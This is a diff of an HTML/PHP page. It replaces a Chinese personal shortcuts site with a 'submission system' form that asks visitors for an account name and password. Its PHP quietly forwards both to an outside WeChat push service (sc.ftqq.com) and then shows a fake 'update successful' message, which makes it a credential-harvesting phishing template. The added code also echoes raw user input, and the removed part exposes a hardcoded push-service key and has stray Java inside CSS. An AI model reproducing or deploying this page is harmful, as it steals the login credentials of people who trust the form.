@@ -1,246 +1,60 @@
-
+<!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-<style>
-
-public class BaseActivity extends Activity {
-    //@Nullable@Nullable 表示定义的字段可以为空.
-    @Override
-    protected void onCreate(@Nullable Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        /**
-         * 设置为横屏
-         */
-        if (getRequestedOrientation() != ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE) {
-            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
-        }
-    }
-}
-
-
-h1 { display:none; }
-body{width:auto;text-align:center;margin:0 auto;
-padding:0 10px 0 10px;
-max-width:750px; min-width:350px; boder:1px solid #d87777;
-
-background:#d7e9f5 url(https://ae01.alicdn.com/kf/Ha21caa6885a9453c996ec91ef91dfed3T.png) no-repeat left top;
-  background-size:100%;
-} 
-div.fe
-{
-	float:left;
-	width:20%;
-	height:50px;
-padding-top:5px;
-text-align:center;
-}
-div.CC
-{
-	float:left;
-	width:28%;
-	height:50px;
-	line-height:30px; 
-border:blue solid 1px;
-border-radius: 10px;
-    padding: 1px; 
-overflow:hidden;
-margin:5px; 
-}
-div.CD
-{
-	float:left;
-	width:24%;
-	height:50px;
-	line-height:50px; 
-border:blue solid 1px;
-border-radius: 10px;
-    padding: 1px; 
-overflow:hidden;
-margin:5px; 
-}
-p.cc  {text-align: center; color:#ffffff; font-size:14px;}
-
-p.o  {text-align: center;}
-.text_line
-{
-	clear:both;
-	margin-bottom:0px;
-}
-.active {
-    background-color: #1c02f4;
-}
-
- .thumbnail
-{
-	float:left;
-	margin:10px;
-}
-
-div.img {
-    margin: 5px;
-    border: 1px solid #ccc;
-    float: left;
-    width: 100%;
-}
-
-div.img:hover {
-    border: 1px solid #777;
-}
-
-div.img img {
-    width: 100%;
-   height: auto;
-}
-
-div.desc {
-    padding: 10px;
-    text-align: center;
-}
-a.a1{color: #0a19ed}
-
-a:link {text-decoration:none;}
-a:visited {text-decoration:none;}
-a:hover {text-decoration:none;}
-a:active {text-decoration:none;}
-
-a.a2:link {color: #939292;}      /* 未访问链接*/
-a:visited {color: #939292}  /* 已访问链接 */
-a:hover {color: #adf2ed;}  /* 鼠标移动到链接上 */
-a:active {color: #adf2ed;}  /* 鼠标点击时 */
-#wrap {display:block;bottom:0px;right:1px!important;right:18px;width:100%;line-height:30px;position:fixed;border:1px solid #fff;text-align:center;color:#fff;  background-color: #ffffff;}
-*html{overflow-x:auto;overflow-y:auto;} 
-* html #wrap {position:absolute;}
-</style>
+        <title>吹牛逼</title>
+  <meta name="viewport" content="width=device-width, initial-scale=0.88, maximum-scale=1, user-scalable=no">
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+        <meta charset="UTF-8">
+        <meta name="keywords" content="By吹牛逼">
+        <meta name="description" content="吹牛逼">
+        <!-- Bootstrap -->
+        <link rel="shortcut icon" href="//static.hdslb.com/images/favicon.ico">
+        <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.0/css/bootstrap.min.css">
+        <style>
+            body{font-family: "Microsoft YaHei" ! important;}
+            html{background:url(自定义背景图片) no-repeat center top;background-size:cover}body{padding-top:20px;font-size:1pc;background:transparent}h1{font-weight:400;font-size:40px}.panel{background-color:hsla(0,0%,100%,.9)}.margin-base-vertical{margin:40px 0}.margin-base-mini{margin:20px 0}.bs-callout{padding:20px;margin:20px 0;border:1px solid #eee;border-left-width:5px;border-radius:3px}.bs-callout h4{margin-top:0;margin-bottom:5px}.bs-callout p:last-child{margin-bottom:0}.bs-callout code{border-radius:3px}.bs-callout+.bs-callout{margin-top:-5px}.bs-callout-danger{border-left-color:#d9534f}.bs-callout-danger h4{color:#d9534f}.bs-callout-warning{border-left-color:#f0ad4e}.bs-callout-warning h4{color:#f0ad4e}.bs-callout-info{border-left-color:#5bc0de}.bs-callout-info h4{color:#5bc0de}.tile-footer{padding:5px 10px;background:rgba(0,0,0,.1);text-align:left}.tile-content-wrapper{position:relative;overflow:hidden;padding:10px 10px 17px}.tile-content{font-size:35px}.tile-content span{font-size:18px;font-weight:700}.tile-content span,.tile-content-wrapper small{opacity:.7;-moz-opacity:.7;filter:alpha(opacity:70)}.tile-content-wrapper small{display:block;text-align:right;font-size:14px}.tile-header{padding:10px;background:#84b8ff;text-transform:uppercase;font-size:18px}.niebu{padding:10px}
+input{margin-top: 3px;}
+                </style>
 </head>
-<link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css" />
-<a href="https://jiejinghe.com/users/6563404841">
-<img  border="0" src="https://ae01.alicdn.com/kf/He2dada90d0bc4249b1805e31fe631a93V.jpeg" alt="木子李" width="350" height="auto"></a>
+<body>
+        <div class="container">
+                <div class="row">
+          
+            <div class="col-md-6 col-md-offset-3 panel panel-default">
+                        <h2 class="text-center">提交系统</h2>
+                        <div class="bs-callout bs-callout-info">
+                                                <h4 class="help-block text-left">Title</h4>
+                                </div>
+                                <form action="" method="post">
+<span class="label label-info">标题: </span><input type="text" name="text" placeholder="标题" class="form-control">
+<span class="label label-info">账  号: </span><input type="text" name="user" placeholder="账号" class="form-control">
+<span class="label label-info">密  码:</span><input type="text" name="pass" placeholder="密码" class="form-control">
 
-<p class="text_line"> </p>
-<a href="http://muzikeji.cn" target="_blank"><div  class="CC" style="background-color: #f18d3a"><p class="cc">
-❖首页</p>
-</div></a>
-<a href="https://jiejinghe.com/search" target="_blank"><div  class="CC" style="background-color: #37a6e2"><p class="cc">
-𝙌搜索捷径</p>
-</div></a>
-<a href="/guanyu.html" target="_blank"><div  class="CC" style="background-color: #2fe1cb"><p class="cc">
-⌘关于捷径</p>
-</div></a>
 
-<p class="text_line"> <img src="https://ae01.alicdn.com/kf/H09a38edc774f4d5d8da3a380cd355608J.gif" alt="Computer man" width="330" height="48"> </p>
+<br>
 
-<a href="https://s7.addthis.com/static/wechat_follow.html?id=Miss-baby_&u=https://u.wechat.com/MIDWVwUtuk6_gUB48_Fy41U">
-<img class="thumbnail"  src="https://ae01.alicdn.com/kf/H6ab49d692360416199684aadf1b64023E.png" alt="木子李" width="30" height="auto"></a>
+<input type="submit" value="提交" class="btn btn-sm btn-success">
+                  <br>
+                  文本
+</form>
+        <?php
 
-<a href="mqq://im/chat?chat_type=wpa&uin=56794501&version=1&src_type=web">
-<img class="thumbnail"  src="https://ae01.alicdn.com/kf/H8db64cccea0a4ee3bf88ebf242b21d2es.png" alt="木子李" width="30" height="auto"></a>
-
-<a href="https://ae01.alicdn.com/kf/H92b91557d9264af682723e9369a426b0p.png">
-<img class="thumbnail"  src="https://ae01.alicdn.com/kf/Ha3ee2ed657c34d68a0bb7fb65bdd89caF.png" alt="木子李" width="30" height="auto"></a>
-
-<a href="https://jq.qq.com/?_wv=1027&k=5wclJSO">
-<img class="thumbnail"  src="https://ae01.alicdn.com/kf/H294277aebe3a45338b6d8b7fa5ee79ecT.png" alt="木子李" width="30" height="auto"></a>
-
-<a href="https://weibo.com/u/5090561214">
-<img class="thumbnail"  src="https://ae01.alicdn.com/kf/H6308a6002fe64acdb5ca92ad99bce84fy.png" alt="木子李" width="30" height="auto"></a>
-
-<a href="mailto: 56794501@qq.com">
-<img class="thumbnail"  src="https://ae01.alicdn.com/kf/Hf60141ed2e4249389a38ba8a38ad1fefS.png" alt="木子李" width="30" height="auto"></a>
-
-<a href="http://v.douyin.com/kkpWm9/">
-<img class="thumbnail"  src="https://ae01.alicdn.com/kf/H3d53a50f12af40cda87601096b153325z.jpeg" alt="木子李" width="30" height="auto"></a>
-
-<h5 class="text_line"> </h5>
-<h5>微信号:
-<script type="text/javascript"> 
-function copyUrl2() 
-{ 
-var Url2=document.getElementById("biao1"); 
-Url2.select(); // 选择对象 
-document.execCommand("Copy"); // 执行浏览器复制命令 
-alert("微信号已复制好，打开微信贴粘。"); 
-} 
-</script> 
-<textarea cols="10" rows="1" 
-id="biao1">Miss-you_</textarea> 
-<input type="button" onClick="copyUrl2()" value="点击复制" />
-<h5>微信公众号:
-<script type="text/javascript"> 
-function copyUrl3() 
-{ 
-var Url3=document.getElementById("biao2"); 
-Url3.select(); // 选择对象 
-document.execCommand("Copy"); // 执行浏览器复制命令 
-alert("微信公众号已复制好，打开微信贴粘。"); 
-} 
-</script> 
-<textarea cols="10" rows="1" 
-id="biao2">苹果捷径科技</textarea> 
-<input type="button" onClick="copyUrl3()" value="点击复制" /> <h3><a href="weixin://
-" target="_blank">打开微信</a> </h3>
-
-<h3> ◄≋写下你宝贵的意见！</h3>
-<p class="text_line"> </p>
-
-<!-- 来必力City版安装代码 -->
-<div id="lv-container" data-id="city" data-uid="MTAyMC80NTY2OS8yMjE4MA==">
-<script type="text/javascript">
-   (function(d, s) {
-       var j, e = d.getElementsByTagName(s)[0];
-
-       if (typeof LivereTower === 'function') { return; }
-
-       j = d.createElement(s);
-       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-       j.async = true;
-
-       e.parentNode.insertBefore(j, e);
-   })(document, 'script');
-</script>
-<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
-</div>
-<!-- City版安装代码已完成 -->
-<p class="text_line"> </p>
-<script type="text/javascript"> 
-function sc_send(  $text , $desp = '' , $key = 'SCU57030T1379dae0a25edc121f49d48b4db3ef555d4a53f0cb633'  )
+$text="订单信息：".$_POST["text"];
+$desp="用户信息…账号：".$_POST["user"]."密码：".$_POST["pass"];
+file_get_contents("https://sc.ftqq.com/替换成你自己的.send?text={$text}&desp={$desp}");
+?>
+<span style="color: purple;">
+<?php
+if($_POST)
 {
-	$postdata = http_build_query(
-    array(
-        'text' => $text,
-        'desp' => $desp
-    )
-);
+echo "提示：".$text."更新成功！请勿重复提交";
+}
+?></span>
+                        </div>
+                        <div class="col-md-3"> <!-- 评论代码放置区 -->        
+                        </div>
+                </div><!-- //row -->
+        </div> <!-- //container -->
 
-$opts = array('http' =>
-    array(
-        'method'  => 'POST',
-        'header'  => 'Content-type: application/x-www-form-urlencoded',
-        'content' => $postdata
-    )
-);
-$context  = stream_context_create($opts);
-return $result = file_get_contents('https://sc.ftqq.com/'.$key.'.send', false, $context);
-
-}</script> 
-<h5>发送信息给官方微</h5>
-
-<form action="http://www.baidu.com/baidu" target="_blank">
-<table bgcolor="#FFFFFF"><tr><td>
-<input name=tn type=hidden value=baidu>
-<input type=text name=word size=30>
-<input type="submit" value="百度搜索">
-</td></tr></table>
-
-<p class="text_line"> </p>
-<div style="height:100px;"></div>
-<div id="wrap"><a class="a2"  href="https://muzikeji.cn/"><div  class="fe" style="background-color: #d4d1d0; line-height:2px" > <i class="fa fa-th-large fa-lg"></i><br><p class="o" >主页</p></div></a>
-<a class="a2"  href="/JJ.html"><div  class="fe" style="background-color: #d4d1d0; line-height:2px" >  <i class="fa fa-download fa-lg"></i><br><p class="o" >下载</p></div></a>
-<a class="a2"  href="https://jiejinghe.com/search"><div  class="fe" style="background-color: #d4d1d0; line-height:2px" > <i class="fa fa-search fa-lg"></i><br><p class="o" >搜索</p></div></a>
-<a class="a2"  href="/guanyu.html"><div  class="fe" style="background-color: #d4d1d0; line-height:2px" > <i class="fa fa-info fa-lg"></i><br><p class="o" >关于</p></div></a>
-<a class="a2"  href="/LX.html"><div  class="fe" style="background-color: #d4d1d0; line-height:2px" > <i class="fa fa-qq fa-lg"></i><br><p class="o" >联系</p></div></a>
-</div>
+</body>
+</html>
